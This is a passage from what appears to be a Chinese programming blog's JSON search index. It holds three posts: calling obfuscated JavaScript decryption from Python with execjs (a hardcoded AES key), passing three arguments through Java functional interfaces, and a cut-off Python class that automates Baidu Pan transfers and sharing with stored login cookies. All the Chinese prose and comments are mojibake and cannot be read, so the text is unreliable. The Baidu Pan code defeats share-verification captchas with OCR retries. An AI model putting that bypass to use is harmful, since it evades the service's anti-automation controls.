"},{"id":20,"href":"/posts/history/python%E4%BD%BF%E7%94%A8execjs%E8%B0%83%E7%94%A8js%E6%96%B9%E6%B3%95/","title":"Pythonä½¿ç”¨execjsè°ƒç”¨jsæ–¹æ³•","section":"æˆ‘çš„åšå®¢","content":"èƒŒæ™¯ï¼š åœ¨ä½¿ç”¨pythonæŠ“åŒ…æ—¶ï¼Œè¦ä½¿ç”¨åˆ°jsçš„ç›¸å…³è§£å¯†æ–¹æ³•ï¼Œä½¿ç”¨pythonå†™ç›¸å…³è§£å¯†æ–¹æ³•å®ç°ä¼šæœ‰ä¸€äº›é—®é¢˜ï¼Œæœ‰æ—¶jsçš„åŠ å¯†æ–¹æ³•æ˜¯æ··æ·†è¿‡çš„ï¼Œæ— æ³•ç›´è¯‘è¿‡æ¥ï¼Œæ‰€ä»¥ç›´æ¥è°ƒç”¨jsçš„æ–¹æ³•æ˜¯æœ€æ–¹ä¾¿çš„ã€‚\nä¸‹é¢æ˜¯execjsä½¿ç”¨çš„ç›¸å…³è®°å½•ï¼š\n1ã€å…ˆåœ¨æœ¬åœ°å®‰è£…nodeç¯å¢ƒï¼Œå› ä¸ºåœ¨ä½¿ç”¨çš„æ—¶å€™ä¼šè°ƒç”¨åˆ°ã€‚\nbrew install node 2ã€ç¼–å†™æ–¹æ³•è°ƒç”¨js\nå®‰è£…è¦ä½¿ç”¨åˆ°çš„crypto-jsæ¨¡å—\nnpm install crypto-js ç¼–å†™æ–¹æ³•è°ƒç”¨\nimport execjs node = execjs.get() ctx = node.compile(\u0026#34;\u0026#34;\u0026#34; const CryptoJS = require(\u0026#39;crypto-js\u0026#39;); //å¼•ç”¨AESæºç js function decrypt(data) { const SECRET_KEY = \u0026#39;pengzhihui\u0026#39; const encryptedHexStr = CryptoJS.enc.Base64.parse(data); const str = CryptoJS.enc.Utf8.stringify(encryptedHexStr); const decrypt = CryptoJS.AES.decrypt(str, SECRET_KEY); const decryptedStr = decrypt.toString(CryptoJS.enc.Utf8); return JSON.parse(decryptedStr) } \u0026#34;\u0026#34;\u0026#34;) res = ctx.call(\u0026#39;decrypt\u0026#39;, detail) "},{"id":21,"href":"/posts/history/function%E7%BC%96%E7%A8%8B%E4%BC%A0%E9%80%92%E4%B8%89%E4%B8%AA%E5%8F%82%E6%95%B0/","title":"Functionç¼–ç¨‹ä¼ é€’ä¸‰ä¸ªå‚æ•°","section":"æˆ‘çš„åšå®¢","content":"\rFunction ç¼–ç¨‹ä¼ é€’ä¸‰ä¸ªå‚æ•°\r#\rjava å†…ç½®çš„Function ç±»æœ‰ä¸¤ä¸ªå‚æ•°Functionå’Œä¸‰ä¸ªå‚æ•°BiFunctionçš„ï¼Œä½†æ˜¯æœ‰æ—¶å°±éœ€è¦ä¼ é€’æ›´å¤šçš„å‚æ•°ï¼Œæ‰èƒ½è¾¾åˆ°æˆ‘ä»¬ä½¿ç”¨çš„åœºæ™¯ã€‚ä»¥ä¸‹è®°å½•ä¸¤ä¸ªä¼ é€’å¤šå°‘å‚æ•°çš„ç”¨æ³•ã€‚\næ¯”å¦‚è®¡ç®—ä¸‰ä¸ªæ•°ç›¸åŠ \na + b + c è‡ªå·±ç¼–å†™ä¸€ä¸ª@FunctionalInterfaceï¼Œæ”¯æŒæ¥æ”¶å¤šä¸ªå‚æ•°\r#\r@FunctionalInterface public interface ThreeParamFunction\u0026lt;T, U, K, R\u0026gt; { R apply(T t, U u, K k); } ThreeParamFunction\u0026lt;Integer, Integer, Integer, Integer\u0026gt; threeParamFunction = (a,b,c) -\u0026gt; { return a + b + c; } Integer add = threeParamFunction.apply(1,2,3); // 6 ä½¿ç”¨å¤šä¸ª@FunctionalInterfaceæ¥æ‹¼æ¥\r#\rBiFunction \u0026lt;Integer, Integer, Function\u0026lt;Integer, Integer\u0026gt;\u0026gt; multiAdder = (a, b) -\u0026gt; c -\u0026gt; { return a + b + c; }; Integer add = multiAdder.apply(1,2).apply(3); // 6 "},{"id":22,"href":"/posts/history/%E4%BD%BF%E7%94%A8python%E5%B0%86%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%89%B9%E9%87%8F%E8%BD%AC%E5%AD%98%E5%B9%B6%E5%88%86%E4%BA%AB/","title":"ä½¿ç”¨pythonå°†ç™¾åº¦ç½‘ç›˜æ‰¹é‡è½¬å­˜å¹¶åˆ†äº«","section":"æˆ‘çš„åšå®¢","content":"\rå‰è¨€\r#\réœ€è¦å°†ä¸€æ‰¹ç™¾åº¦ç½‘ç›˜èµ„æºæ‰¹é‡ä¿å­˜åˆ°è‡ªå·±çš„ç½‘ç›˜ï¼Œå¹¶åˆ†äº«å‡ºæ¥ä½¿ç”¨ï¼Œä¼ ç»Ÿæ‰‹åŠ¨è½¬å­˜å’Œåˆ†äº«çš„æ–¹å¼å¤ªæ…¢äº†ï¼Œæ‰€ä»¥ç¼–å†™äº†ä»¥ä¸‹ç¨‹åºå¿«é€Ÿè¾¾åˆ°ç›®çš„ã€‚\nä»£ç \r#\rimport base64 import requests import re import time import random import math from urllib.parse import unquote import ddddocr class BaiDuPan(object): def __init__(self): # åˆ›å»ºsessionå¹¶è®¾ç½®åˆå§‹ç™»å½•Cookie self.session = requests.session() self.session.cookies[\u0026#39;BAIDUID\u0026#39;] = \u0026#39;\u0026#39; self.session.cookies[\u0026#39;BDUSS\u0026#39;] = \u0026#39;\u0026#39; self.session.cookies[\u0026#39;STOKEN\u0026#39;] = \u0026#39;\u0026#39; self.headers = { \u0026#39;Host\u0026#39;: \u0026#39;pan.baidu.com\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\u0026#39;, } self.login_info = { \u0026#39;bdstoken\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;username\u0026#39;: \u0026#39;\u0026#39; } \u0026#39;\u0026#39;\u0026#39; éªŒè¯Cookieæ˜¯å¦å·²ç™»å½• è¿”å›å€¼errnoä»£è¡¨çš„æ„æ€ï¼š 0 æœ‰æ•ˆçš„Cookieï¼›1 initæ–¹æ³•ä¸­æœªé…ç½®ç™»å½•Cookieï¼›2 æ— æ•ˆçš„Cookie \u0026#39;\u0026#39;\u0026#39; def verifyCookie(self): if(self.session.cookies[\u0026#39;BAIDUID\u0026#39;] == \u0026#39;\u0026#39;): return {\u0026#39;errno\u0026#39;: 1, \u0026#39;err_msg\u0026#39;: \u0026#39;è¯·åœ¨initæ–¹æ³•ä¸­é…ç½®ç™¾åº¦ç½‘ç›˜ç™»å½•Cookie\u0026#39;} else: params = { \u0026#39;clienttype\u0026#39;: 0, \u0026#39;app_id\u0026#39;: 250528, \u0026#39;web\u0026#39;: 1, \u0026#39;dp-logid\u0026#39;: self.getDpLogId() } response = self.session.get(\u0026#39;https://pan.baidu.com/api/loginStatus\u0026#39;, params=params, headers=self.headers) login_info = response.json().get(\u0026#39;login_info\u0026#39;) if(response and login_info != None): print(response.json()) self.login_info[\u0026#39;bdstoken\u0026#39;] = login_info.get(\u0026#39;bdstoken\u0026#39;) self.login_info[\u0026#39;username\u0026#39;] = login_info.get(\u0026#39;username\u0026#39;) return {\u0026#39;errno\u0026#39;: 0, \u0026#39;err_msg\u0026#39;: \u0026#39;æœ‰æ•ˆçš„Cookieï¼Œç”¨æˆ·åï¼š%s\u0026#39; % login_info.get(\u0026#39;username\u0026#39;)} else: return {\u0026#39;errno\u0026#39;: 2, \u0026#39;err_msg\u0026#39;: \u0026#39;æ— æ•ˆçš„Cookieï¼\u0026#39;} \u0026#39;\u0026#39;\u0026#39; è·å–æŒ‡å®šç›®å½•çš„æ–‡ä»¶åˆ—è¡¨ï¼Œç›´æ¥è¿”å›åŸå§‹çš„json \u0026#39;\u0026#39;\u0026#39; def getFileList(self, dir=\u0026#39;/\u0026#39;, order=\u0026#39;time\u0026#39;, desc=1, page=1, num=100): # è®¿é—®é¦–é¡µè·å–bdstoken params = { \u0026#39;clienttype\u0026#39;: 0, \u0026#39;app_id\u0026#39;: 250528, \u0026#39;web\u0026#39;: 1, \u0026#39;dp-logid\u0026#39;: self.getDpLogId(), \u0026#39;order\u0026#39;: order, \u0026#39;desc\u0026#39;: desc, \u0026#39;dir\u0026#39;: dir, \u0026#39;num\u0026#39;: num, \u0026#39;page\u0026#39;: page } url = \u0026#39;https://pan.baidu.com/api/list\u0026#39; headers = self.headers headers[\u0026#39;Referer\u0026#39;] = \u0026#39;https://pan.baidu.com/disk/main\u0026#39; response = self.session.get(url, params=params, headers=headers) return response.json() \u0026#39;\u0026#39;\u0026#39; è¯†åˆ« éªŒè¯åŠ å¯†åˆ†äº«æ—¶çš„éªŒè¯ç  è¿”å›å€¼errnoä»£è¡¨çš„æ„æ€ï¼š 0 è¯†åˆ«æˆåŠŸï¼›1 è¯†åˆ«å¤±è´¥ï¼›å…¶ä»–å€¼ è·å–éªŒè¯ç å¤±è´¥ï¼› \u0026#39;\u0026#39;\u0026#39; def vcodeOCR(self): # è·å–éªŒè¯ç  vcode_res = requests.get(\u0026#39;https://pan.baidu.com/api/getcaptcha?prod=shareverify\u0026amp;web=1\u0026amp;channel=chunlei\u0026amp;web=1\u0026amp;app_id=250528\u0026amp;bdstoken=null\u0026amp;clienttype=0\u0026#39;, headers=self.headers) vcode_json = vcode_res.json() if(vcode_json[\u0026#39;errno\u0026#39;] == 0): # è·å–éªŒè¯ç å›¾ç‰‡ genimage = requests.get(vcode_json[\u0026#39;vcode_img\u0026#39;], headers=self.headers) ocr = ddddocr.DdddOcr() vcode = ocr.classification(genimage.content) print(\u0026#34;éªŒè¯ç æ˜¯ï¼š\u0026#34;, vcode) errno, err_msg = (1, \u0026#39;è¯†åˆ«å¤±è´¥\u0026#39;) if(len(vcode) != 4) else (0, \u0026#39;è¯†åˆ«æˆåŠŸ\u0026#39;) vcode_str = vcode_json[\u0026#39;vcode_str\u0026#39;] else: errno = vcode_json[\u0026#39;errno\u0026#39;] err_msg = \u0026#39;è·å–éªŒè¯ç å¤±è´¥\u0026#39; vcode_str = \u0026#39;\u0026#39; vcode = \u0026#39;\u0026#39; return {\u0026#39;errno\u0026#39;: errno, \u0026#39;err_msg\u0026#39;: err_msg, \u0026#39;vcode\u0026#39;: vcode, \u0026#39;vcode_str\u0026#39;: vcode_str} \u0026#39;\u0026#39;\u0026#39; éªŒè¯åŠ å¯†åˆ†äº« è¿”å›å€¼errnoä»£è¡¨çš„æ„æ€ï¼š 0 åŠ å¯†åˆ†äº«éªŒè¯é€šè¿‡ï¼›1 éªŒè¯ç è·å–å¤±è´¥ï¼›2 æå–ç ä¸æ­£ç¡®ï¼›3 åŠ å¯†åˆ†äº«éªŒè¯å¤±è´¥ï¼›4 é‡è¯•å‡ æ¬¡åï¼ŒéªŒè¯ç ä¾æ—§ä¸æ­£ç¡®ï¼› \u0026#39;\u0026#39;\u0026#39; def verifyShare(self, surl, pwd, referer, retryTime = 2): t = str(int(time.time()) * 1000) params = { \u0026#39;surl\u0026#39;: surl, \u0026#39;t\u0026#39;: t, \u0026#39;channel\u0026#39;: \u0026#39;chunlei\u0026#39;, \u0026#39;web\u0026#39;: 1, \u0026#39;app_id\u0026#39;: 250528, \u0026#39;bdstoken\u0026#39;: self.login_info.get(\u0026#39;bdstoken\u0026#39;), \u0026#39;logid\u0026#39;: self.getLogid(), \u0026#39;clienttype\u0026#39;: 0 } url = \u0026#39;https://pan.baidu.com/share/verify\u0026#39; form_data = { \u0026#39;pwd\u0026#39;: pwd, \u0026#39;vcode\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;vcode_str\u0026#39;: \u0026#39;\u0026#39;, } # è®¾ç½®é‡è¯•æœºåˆ¶ is_vcode = False # è¯•ç”¨å‡ æ¬¡å°±å¯ä»¥ for n in range(0, retryTime): # è‡ªåŠ¨è·å–å¹¶è¯†åˆ«éªŒè¯ç ï¼Œä½¿ç”¨pytesseractè‡ªåŠ¨è¯†åˆ«æ—¶ï¼Œå¯åŠ å¤§é‡è¯•æ¬¡æ•° if is_vcode: ocr_result = self.vcodeOCR() if(ocr_result[\u0026#39;errno\u0026#39;] == 0): form_data[\u0026#39;vcode\u0026#39;] = ocr_result[\u0026#39;vcode\u0026#39;] form_data[\u0026#39;vcode_str\u0026#39;] = ocr_result[\u0026#39;vcode_str\u0026#39;] elif(ocr_result[\u0026#39;errno\u0026#39;] == 1): continue else: return {\u0026#39;errno\u0026#39;: 1, \u0026#39;err_msg\u0026#39;: \u0026#39;éªŒè¯ç è·å–å¤±è´¥ï¼š%d\u0026#39; % ocr_result[\u0026#39;errno\u0026#39;]} headers = self.headers headers[\u0026#39;referer\u0026#39;] = referer # verify_json[\u0026#39;errno\u0026#39;]ï¼š-9è¡¨ç¤ºæå–ç ä¸æ­£ç¡®ï¼›-62è¡¨ç¤ºéœ€è¦éªŒè¯ç /éªŒè¯ç ä¸æ­£ç¡®ï¼ˆä¸è¾“å…¥éªŒè¯ç ä¹Ÿæ˜¯æ­¤è¿”å›å€¼ï¼‰ verify_res = self.session.post(url, headers=headers, params=params, data=form_data) verify_json = verify_res.json() cookie = verify_res.cookies.get(\u0026#39;BDCLND\u0026#39;) if(verify_json[\u0026#39;errno\u0026#39;] == 0): return {\u0026#39;errno\u0026#39;: 0, \u0026#39;err_msg\u0026#39;: \u0026#39;åŠ å¯†åˆ†äº«éªŒè¯é€šè¿‡\u0026#39;, \u0026#39;BDCLND\u0026#39;: cookie} elif(verify_json[\u0026#39;errno\u0026#39;] == -9): return {\u0026#39;errno\u0026#39;: 2, \u0026#39;err_msg\u0026#39;: \u0026#39;æå–ç ä¸æ­£ç¡®\u0026#39;} elif(verify_json[\u0026#39;errno\u0026#39;] == -62): is_vcode = True else: return {\u0026#39;errno\u0026#39;: 3, \u0026#39;err_msg\u0026#39;: \u0026#39;åŠ å¯†åˆ†äº«éªŒè¯å¤±è´¥ï¼š%d\u0026#39; % verify_json[\u0026#39;errno\u0026#39;]} return {\u0026#39;errno\u0026#39;: 4, \u0026#39;err_msg\u0026#39;: \u0026#39;é‡è¯•å¤šæ¬¡åï¼ŒéªŒè¯ç ä¾æ—§ä¸æ­£ç¡®ï¼š%d\u0026#39; % (verify_json[\u0026#39;errno\u0026#39;] if(\u0026#34;verify_json\u0026#34; in locals()) else -1)} \u0026#39;\u0026#39;\u0026#39; è¿”å›å€¼errnoä»£è¡¨çš„æ„æ€ï¼š 0 è½¬å­˜æˆåŠŸï¼›1 æ— æ•ˆçš„åˆ†äº«é“¾æ¥ï¼›2 åˆ†äº«æ–‡ä»¶å·²è¢«åˆ é™¤ï¼› 3 åˆ†äº«æ–‡ä»¶å·²è¢«å–æ¶ˆï¼›4 åˆ†äº«å†…å®¹ä¾µæƒï¼Œæ— æ³•è®¿é—®ï¼›5 æ‰¾ä¸åˆ°æ–‡ä»¶ï¼›6 åˆ†äº«æ–‡ä»¶å·²è¿‡æœŸ 7 è·å–æå–ç å¤±è´¥ï¼›8 è·å–åŠ å¯†cookieå¤±è´¥ï¼› 9 è½¬å­˜å¤±è´¥ï¼› \u0026#39;\u0026#39;\u0026#39; def saveShare(self, url, pwd=None, path=\u0026#39;/\u0026#39;): share_res = self.session.get(url, headers=self.headers) share_page = share_res.content.decode(\u0026#34;utf-8\u0026#34;) \u0026#39;\u0026#39;\u0026#39; 1.å¦‚æœåˆ†äº«é“¾æ¥æœ‰å¯†ç ï¼Œä¼šè¢«é‡å®šå‘è‡³è¾“å…¥å¯†ç çš„é¡µé¢ï¼› 2.å¦‚æœåˆ†äº«é“¾æ¥ä¸å­˜åœ¨ï¼Œä¼šè¢«é‡å®šå‘è‡³404é¡µé¢https://pan.baidu.com/error/404.htmlï¼Œä½†æ˜¯çŠ¶æ€ç æ˜¯200ï¼› 3.å¦‚æœåˆ†äº«é“¾æ¥å·²è¢«åˆ é™¤ï¼Œé¡µé¢ä¼šæç¤ºï¼šå•Šå“¦ï¼Œä½ æ¥æ™šäº†ï¼Œåˆ†äº«çš„æ–‡ä»¶å·²ç»è¢«åˆ é™¤äº†ï¼Œä¸‹æ¬¡è¦æ—©ç‚¹å“Ÿã€‚ 4.å¦‚æœåˆ†äº«é“¾æ¥å·²è¢«å–æ¶ˆï¼Œé¡µé¢ä¼šæç¤ºï¼šå•Šå“¦ï¼Œä½ æ¥æ™šäº†ï¼Œåˆ†äº«çš„æ–‡ä»¶å·²ç»è¢«å–æ¶ˆäº†ï¼Œä¸‹æ¬¡è¦æ—©ç‚¹å“Ÿã€‚ 5.å¦‚æœåˆ†äº«é“¾æ¥æ¶‰åŠä¾µæƒï¼Œé¡µé¢ä¼šæç¤ºï¼šæ­¤é“¾æ¥åˆ†äº«å†…å®¹å¯èƒ½å› ä¸ºæ¶‰åŠä¾µæƒã€è‰²æƒ…ã€ååŠ¨ã€ä½ä¿—ç­‰ä¿¡æ¯ï¼Œæ— æ³•è®¿é—®ï¼ 6.å•Šå“¦ï¼é“¾æ¥é”™è¯¯æ²¡æ‰¾åˆ°æ–‡ä»¶ï¼Œè¯·æ‰“å¼€æ­£ç¡®çš„åˆ†äº«é“¾æ¥! 7.å•Šå“¦ï¼Œæ¥æ™šäº†ï¼Œè¯¥åˆ†äº«æ–‡ä»¶å·²è¿‡æœŸ \u0026#39;\u0026#39;\u0026#39; if(\u0026#39;error/404.html\u0026#39; in share_res.url): return {\u0026#34;errno\u0026#34;: 1, \u0026#34;err_msg\u0026#34;: \u0026#34;æ— æ•ˆçš„åˆ†äº«é“¾æ¥\u0026#34;, \u0026#34;extra\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;info\u0026#34;: \u0026#34;\u0026#34;} if(\u0026#39;ä½ æ¥æ™šäº†ï¼Œåˆ†äº«çš„æ–‡ä»¶å·²ç»è¢«åˆ é™¤äº†ï¼Œä¸‹æ¬¡è¦æ—©ç‚¹å“Ÿ\u0026#39; in share_page): return {\u0026#34;errno\u0026#34;: 2, \u0026#34;err_msg\u0026#34;: \u0026#34;åˆ†äº«æ–‡ä»¶å·²è¢«åˆ é™¤\u0026#34;, \u0026#34;extra\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;info\u0026#34;: \u0026#34;\u0026#34;} if(\u0026#39;ä½ æ¥æ™šäº†ï¼Œåˆ†äº«çš„æ–‡ä»¶å·²ç»è¢«å–æ¶ˆäº†ï¼Œä¸‹æ¬¡è¦æ—©ç‚¹å“Ÿ\u0026#39; in share_page): return {\u0026#34;errno\u0026#34;: 3, \u0026#34;err_msg\u0026#34;: \u0026#34;åˆ†äº«æ–‡ä»¶å·²è¢«å–æ¶ˆ\u0026#34;, \u0026#34;extra\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;info\u0026#34;: \u0026#34;\u0026#34;} if(\u0026#39;æ­¤é“¾æ¥åˆ†äº«å†…å®¹å¯èƒ½å› ä¸ºæ¶‰åŠä¾µæƒã€è‰²æƒ…ã€ååŠ¨ã€ä½ä¿—ç­‰ä¿¡æ¯ï¼Œæ— æ³•è®¿é—®\u0026#39; in share_page): return {\u0026#34;errno\u0026#34;: 4, \u0026#34;err_msg\u0026#34;: \u0026#34;åˆ†äº«å†…å®¹ä¾µæƒï¼Œæ— æ³•è®¿é—®\u0026#34;, \u0026#34;extra\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;info\u0026#34;: \u0026#34;\u0026#34;} if(\u0026#39;é“¾æ¥é”™è¯¯æ²¡æ‰¾åˆ°æ–‡ä»¶ï¼Œè¯·æ‰“å¼€æ­£ç¡®çš„åˆ†äº«é“¾æ¥\u0026#39; in share_page): return {\u0026#34;errno\u0026#34;: 5, \u0026#34;err_msg\u0026#34;: \u0026#34;é“¾æ¥é”™è¯¯æ²¡æ‰¾åˆ°æ–‡ä»¶\u0026#34;, \u0026#34;extra\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;info\u0026#34;: \u0026#34;\u0026#34;} if(\u0026#39;å•Šå“¦ï¼Œæ¥æ™šäº†ï¼Œè¯¥åˆ†äº«æ–‡ä»¶å·²è¿‡æœŸ\u0026#39; in share_page): return {\u0026#34;errno\u0026#34;: 6, \u0026#34;err_msg\u0026#34;: \u0026#34;åˆ†äº«æ–‡ä»¶å·²è¿‡æœŸ\u0026#34;, \u0026#34;extra\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;info\u0026#34;: \u0026#34;\u0026#34;} # å¦‚æœåŠ å¯†åˆ†äº«ï¼Œéœ€è¦éªŒè¯æå–ç ï¼Œå¸¦ä¸ŠéªŒè¯é€šè¿‡çš„Cookieå†è¯·æ±‚åˆ†äº«é“¾æ¥ï¼Œå³å¯è·å–åˆ†äº«æ–‡ä»¶ BDCLND = \u0026#39;\u0026#39; if(\u0026#39;init\u0026#39; in share_res.url): surl = re.findall(r\u0026#39;surl=(.+?)$\u0026#39;, share_res.url)[0] referer = share_res.url verify_result = self.verifyShare(surl, pwd, referer) if(verify_result[\u0026#39;errno\u0026#39;] != 0): return {\u0026#34;errno\u0026#34;: 8, \u0026#34;err_msg\u0026#34;: verify_result[\u0026#39;err_msg\u0026#39;], \u0026#34;extra\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;info\u0026#34;: \u0026#34;\u0026#34;} else: # åŠ å¯†åˆ†äº«éªŒè¯é€šè¿‡åï¼Œä½¿ç”¨å…¨å±€sessionåˆ·æ–°é¡µé¢ï¼ˆå…¨å±€sessionä¸­å¸¦æœ‰è§£å¯†çš„Cookieï¼‰ BDCLND = verify_result.get(\u0026#39;BDCLND\u0026#39;) share_res = self.session.get(url, headers=self.headers) save_url = \u0026#39;https://pan.baidu.com/share/transfer\u0026#39; share_uk = re.findall(r\u0026#39;share_uk:\u0026#34;(\\d+)\u0026#34;\u0026#39;, share_res.text)[0] shareid = re.findall(r\u0026#39;shareid:\u0026#34;(\\d+)\u0026#34;\u0026#39;, share_res.text)[0] # 531611295189884 fs_id = re.findall(r\u0026#39;fs_id\u0026#34;:(\\d+),\u0026#39;, share_res.text)[0] sekey = unquote(BDCLND) logid = self.getLogid() dplogid = self.getDpLogId() params = { \u0026#39;shareid\u0026#39;: shareid, \u0026#39;from\u0026#39;: share_uk, \u0026#39;sekey\u0026#39;: sekey, \u0026#39;channel\u0026#39;: \u0026#39;chunlei\u0026#39;, \u0026#39;web\u0026#39;: \u0026#39;1\u0026#39;, \u0026#39;app_id\u0026#39;: 250528, \u0026#39;bdstoken\u0026#39;: self.login_info[\u0026#39;bdstoken\u0026#39;], \u0026#39;logid\u0026#39;: logid, \u0026#39;clienttype\u0026#39;: \u0026#39;0\u0026#39;, \u0026#39;dp-logid\u0026#39;: dplogid, } form_data = { \u0026#39;fsidlist\u0026#39;: f\u0026#39;[{fs_id}]\u0026#39;, \u0026#39;path\u0026#39;: path } headers = self.headers headers[\u0026#39;Origin\u0026#39;] = \u0026#39;https://pan.baidu.com\u0026#39; headers[\u0026#39;referer\u0026#39;] = url \u0026#39;\u0026#39;\u0026#39; ç”¨å¸¦ç™»å½•Cookieçš„å…¨å±€sessionè¯·æ±‚è½¬å­˜ å¦‚æœæœ‰åŒåæ–‡ä»¶ï¼Œä¿å­˜çš„æ—¶å€™ä¼šè‡ªåŠ¨é‡å‘½åï¼šç±»ä¼¼xxx(1) æš‚æ—¶ä¸æ”¯æŒè¶…è¿‡æ–‡ä»¶æ•°é‡çš„æ–‡ä»¶ä¿å­˜ \u0026#39;\u0026#39;\u0026#39; save_res = self.session.post(save_url, headers=headers, params=params, data=form_data) save_json = save_res.json() errno, err_msg, extra, info = (0, \u0026#39;è½¬å­˜æˆåŠŸ\u0026#39;, save_json[\u0026#39;extra\u0026#39;], save_json[\u0026#39;info\u0026#39;]) if(save_json[\u0026#39;errno\u0026#39;] == 0) else (9, \u0026#39;è½¬å­˜å¤±è´¥ï¼š%d\u0026#39; % save_json[\u0026#39;errno\u0026#39;], \u0026#39;\u0026#39;, \u0026#39;\u0026#39;) return {\u0026#39;errno\u0026#39;: errno, \u0026#39;err_msg\u0026#39;: err_msg, \u0026#34;extra\u0026#34;: extra, \u0026#34;info\u0026#34;: info} \u0026#39;\u0026#39;\u0026#39; é‡å‘½åæŒ‡å®šæ–‡ä»¶ 0 é‡å‘½åæˆåŠŸï¼›1 é‡å‘½åå¤±è´¥ï¼› \u0026#39;\u0026#39;\u0026#39; def rename(self, path, newname): bdstoken = self.login_info[\u0026#39;bdstoken\u0026#39;] url = \u0026#39;https://pan.baidu.com/api/filemanager\u0026#39; params = { \u0026#39;async\u0026#39;: 2, \u0026#39;onnest\u0026#39;: \u0026#39;fail\u0026#39;, \u0026#39;opera\u0026#39;: \u0026#39;rename\u0026#39;, \u0026#39;bdstoken\u0026#39;: bdstoken, \u0026#39;clienttype\u0026#39;: 0, \u0026#39;app_id\u0026#39;: 250528, \u0026#39;web\u0026#39;: 1, \u0026#39;dp-logid\u0026#39;: self.getDpLogId() } form_data = {\u0026#34;filelist\u0026#34;: \u0026#34;[{\\\u0026#34;path\\\u0026#34;:\\\u0026#34;%s\\\u0026#34;,\\\u0026#34;newname\\\u0026#34;:\\\u0026#34;%s\\\u0026#34;}]\u0026#34; % (path, newname)} response = self.session.post(url, headers=self.headers, params=params, data=form_data) if(response.json()[\u0026#39;errno\u0026#39;] == 0): return {\u0026#39;errno\u0026#39;: 0, \u0026#39;err_msg\u0026#39;: \u0026#39;é‡å‘½åæˆåŠŸï¼\u0026#39;} else: return {\u0026#39;errno\u0026#39;: 1, \u0026#39;err_msg\u0026#39;: \u0026#39;é‡å‘½åå¤±è´¥ï¼\u0026#39;, \u0026#39;info\u0026#39;: response.json()} \u0026#39;\u0026#39;\u0026#39; åˆ é™¤æŒ‡å®šæ–‡ä»¶ 0 åˆ é™¤æˆåŠŸï¼›1 åˆ é™¤å¤±è´¥ï¼› \u0026#39;\u0026#39;\u0026#39; def delete(self, path): bdstoken = self.login_info[\u0026#39;bdstoken\u0026#39;] url = \u0026#39;https://pan.baidu.com/api/filemanager\u0026#39; params = { \u0026#39;async\u0026#39;: 2, \u0026#39;onnest\u0026#39;: \u0026#39;fail\u0026#39;, \u0026#39;opera\u0026#39;: \u0026#39;delete\u0026#39;, \u0026#39;bdstoken\u0026#39;: bdstoken, \u0026#39;clienttype\u0026#39;: 0, \u0026#39;app_id\u0026#39;: 250528, \u0026#39;web\u0026#39;: 1, \u0026#39;dp-logid\u0026#39;: self.getDpLogId() } form_data = {\u0026#34;filelist\u0026#34;: \u0026#34;[\\\u0026#34;%s\\\u0026#34;]\u0026#34; % path} response = self.session.post(url, headers=self.headers, params=params, data=form_data) if(response.json()[\u0026#39;errno\u0026#39;] == 0): return {\u0026#39;errno\u0026#39;: 0, \u0026#39;err_msg\u0026#39;: \u0026#39;åˆ é™¤æˆåŠŸï¼\u0026#39;} else: return {\u0026#39;errno\u0026#39;: 1, \u0026#39;err_msg\u0026#39;: \u0026#39;åˆ é™¤å¤±è´¥ï¼\u0026#39;, \u0026#39;info\u0026#39;: response.json()} \u0026#39;\u0026#39;\u0026#39; ç§»åŠ¨æ–‡ä»¶è‡³æŒ‡å®šç›®å½• 0 åˆ é™¤æˆåŠŸï¼›1 åˆ é™¤å¤±è´¥ï¼› destination ç§»åŠ¨çš„ç›®å½• \u0026#39;\u0026#39;\u0026#39; def move(self, path, destination, newname=False): bdstoken = self.login_info[\u0026#39;bdstoken\u0026#39;] url = \u0026#39;https://pan.baidu.com/api/filemanager\u0026#39; params = { \u0026#39;async\u0026#39;: 2, \u0026#39;onnest\u0026#39;: \u0026#39;fail\u0026#39;, \u0026#39;opera\u0026#39;: \u0026#39;move\u0026#39;, \u0026#39;bdstoken\u0026#39;: bdstoken, \u0026#39;clienttype\u0026#39;: 0, \u0026#39;app_id\u0026#39;: 250528, \u0026#39;web\u0026#39;: 1, \u0026#39;dp-logid\u0026#39;: self.getDpLogId() } if(not newname): newname = path.split(\u0026#39;/\u0026#39;)[-1] form_data = {\u0026#34;filelist\u0026#34;: \u0026#34;[{\\\u0026#34;path\\\u0026#34;:\\\u0026#34;%s\\\u0026#34;,\\\u0026#34;dest\\\u0026#34;:\\\u0026#34;%s\\\u0026#34;,\\\u0026#34;newname\\\u0026#34;:\\\u0026#34;%s\\\u0026#34;}]\u0026#34; % (path, destination, newname)} response = self.session.post(url, headers=self.headers, params=params, data=form_data) if(response.json()[\u0026#39;errno\u0026#39;] == 0): return {\u0026#39;errno\u0026#39;: 0, \u0026#39;err_msg\u0026#39;: \u0026#39;ç§»åŠ¨æˆåŠŸï¼\u0026#39;} else: return {\u0026#39;errno\u0026#39;: 1, \u0026#39;err_msg\u0026#39;: \u0026#39;ç§»åŠ¨å¤±è´¥ï¼\u0026#39;, \u0026#39;info\u0026#39;: response.json()} \u0026#39;\u0026#39;\u0026#39; åˆ›å»ºåˆ†äº«é“¾æ¥ fid_listä¸ºåˆ—è¡¨ï¼Œä¾‹å¦‚ï¼š[1110768251780445] 0 åˆ›å»ºæˆåŠŸï¼›1 åˆ›å»ºå¤±è´¥ï¼› \u0026#39;\u0026#39;\u0026#39; def createShareLink(self, fid_list, period=0, pwd=False): bdstoken = self.login_info[\u0026#39;bdstoken\u0026#39;] url = \u0026#39;https://pan.baidu.com/share/set\u0026#39; params = { \u0026#39;bdstoken\u0026#39;: bdstoken, \u0026#39;channel\u0026#39;: \u0026#39;chunlei\u0026#39;, \u0026#39;web\u0026#39;: 1, \u0026#39;app_id\u0026#39;: 250528, \u0026#39;logid\u0026#39;: self.getLogid(), \u0026#39;clienttype\u0026#39;: 0 } if(not pwd): pwd = self.generatePwd() \u0026#39;\u0026#39;\u0026#39; schannel=4 ä¸çŸ¥é“ä»€ä¹ˆæ„æ€ï¼Œå›ºå®šä¸º4 